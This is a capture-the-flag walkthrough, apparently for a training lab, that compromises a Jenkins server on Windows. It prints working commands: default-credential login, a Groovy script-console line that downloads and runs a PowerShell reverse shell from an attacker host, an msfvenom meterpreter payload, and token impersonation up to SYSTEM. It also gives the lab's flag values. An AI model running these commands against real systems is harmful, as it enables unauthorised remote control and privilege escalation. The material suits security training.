# Alfred

> Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

<br>

### Process:

1. Initial Access:
	- basic port scan: `nmap -T4 10.10.61.207`
	- number of ports open = **3**
	- find username and password on user panel: 
		- try default credentials
		- username/password = **admin**:**admin**
	- find feature that lets you execute commands on underlying system:
		- found script console at 10.10.61.207:8080/computer/(master)/script 
	- get reverse shell:
		- download PowerShell reverse shell from [nishang github](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
		- host reverse shell on attacker machine: `python3 -m http.server 1234`
		- setup netcat listener on attacker machine: `nc -lvnp 4444`
		- execute powershell download and run command: `println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.70.79:1234/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.70.79 -Port 4444".execute().text`
	-  read user.txt flag:
		-  `cd /Users/bruce/Desktop` -> `cat user.txt`
		-  flag = **79007a09481963edf2e1321abd9ae2a0**
2. Switching Shells (switch to a metepreter shell):
	- create windows meterpreter reverse shell payload:
		- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.70.79 LPORT=1234 -f exe -o shell2.exe`
	- setup metasploit handler in metasploit:
		- `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.70.79 set LPORT 1234 run`
	- host meterpreter reverse shell: `python -m http.server 8080`
	- download payload to machine as before:
		- `println "powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.10.70.79:8080/shell2.exe','shell2.exe')\"".execute().text`
	- then start the new shell (through the old one):
		- `Start-Process "shell2.exe"`
	- final size of exe payload generated = **73802**
3. Privilege Escalation:
	- view all the privileges using `getprivs`:
		- have SeDebugPrivilege and SeImpersonatePrivilege that can be abused 
	- load the incognito module: `load incognito`
	- list tokens by unqiue group name: `list_tokens -g`
	- impersonate the "BUILTIN\Adminstrators" token: `impersonate_token "BUILTIN\Adminstrators"`
	- new user (output of `getuid` command) = **NT AUTHORITY\\SYSTEM**
	- migrate to a new process with matching permissions to new SYSTEM user to gain full permissions:
		- `ps` -> `migrate 1724` (any process running as SYSTEM)
	- read the root.txt file at C:\\Windows\\System32\\config:
		- `cd /windows/system32/config` -> `cat root.txt`

